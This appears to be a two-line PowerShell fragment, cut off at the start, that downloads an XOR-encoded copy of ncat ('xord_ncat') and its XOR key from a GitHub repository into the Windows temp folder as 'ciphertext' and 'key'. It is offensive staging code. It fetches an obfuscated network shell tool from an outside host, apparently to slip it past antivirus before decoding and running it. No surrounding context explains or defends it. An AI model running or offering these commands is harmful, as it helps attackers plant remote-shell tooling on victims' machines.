...
(new-object Net.WebClient).DownloadFile('https://github.com/slyyedyye/Tools/raw/master/xord_ncat' , $env:temp+"/ciphertext") 
(new-object Net.WebClient).DownloadFile('https://github.com/slyyedyye/Tools/raw/master/xor_key.txt' , $env:temp+"/key") 
